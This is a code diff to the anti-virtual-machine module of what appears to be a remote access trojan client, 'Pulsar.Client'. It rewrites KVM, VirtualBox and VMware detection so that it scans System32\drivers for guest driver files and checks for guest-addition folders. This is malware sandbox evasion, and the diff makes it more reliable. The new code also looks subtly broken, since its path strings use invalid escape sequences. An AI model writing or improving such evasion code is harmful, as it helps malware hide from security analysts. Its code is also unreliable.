@@ -119,19 +119,20 @@ namespace Pulsar.Client.Anti.VM
         public static bool CheckForKVM()
         {
             string[] BadDriversList = { "balloon.sys", "netkvm.sys", "vioinput", "viofs.sys", "vioser.sys" };
-            foreach (string Drivers in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*"))
+            string driversPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers");
+            foreach (string driver in Directory.GetFiles(driversPath, "*"))
             {
-                foreach (string BadDrivers in BadDriversList)
+                foreach (string badDriver in BadDriversList)
                 {
-                    if (Utils.Contains(Drivers, BadDrivers))
+                    if (Path.GetFileName(driver).IndexOf(badDriver, StringComparison.OrdinalIgnoreCase) >= 0)
                     {
                         return true;
                     }
                 }
             }
-
             return false;
         }
+
 
         /// <summary>
         /// Checks if the current user name matches any blacklisted names.
@@ -159,40 +160,24 @@ namespace Pulsar.Client.Anti.VM
         {
             try
             {
-                string[] BadFileNames = { "VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys", "vmmouse.sys", "vboxogl.dll" };
-                string[] BadDirs = { @"C:\Program Files\VMware", @"C:\Program Files\oracle\virtualbox guest additions" };
-                foreach (string System32File in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System)))
+                string[] badFiles = { "balloon.sys", "VBoxMouse.sys", "netkvm.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys", "vmmouse.sys"};
+                string[] badDirs = { "C:\Program Files\VMware", "C:\Program Files\Oracle\VirtualBox Guest Additions" };
+                string driversPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers");
+        
+                foreach (string file in Directory.GetFiles(driversPath))
                 {
-                    try
-                    {
-                        foreach (string BadFileName in BadFileNames)
-                        {
-                            if (File.Exists(System32File) && Path.GetFileName(System32File).ToLower() == BadFileName.ToLower())
-                            {
-                                return true;
-                            }
-                        }
-                    }
-                    catch
-                    {
-                        continue;
-                    }
-                }
-
-                foreach (string BadDir in BadDirs)
-                {
-                    if (Directory.Exists(BadDir.ToLower()))
-                    {
+                    if (badFiles.Any(badFile => Path.GetFileName(file).Equals(badFile, StringComparison.OrdinalIgnoreCase)))
                         return true;
-                    }
                 }
+        
+                return badDirs.Any(dir => Directory.Exists(dir));
             }
             catch
             {
-
+                return false;
             }
-            return false;
         }
+
 
         /// <summary>
         /// Checks for the presence of bad VM-related process names.
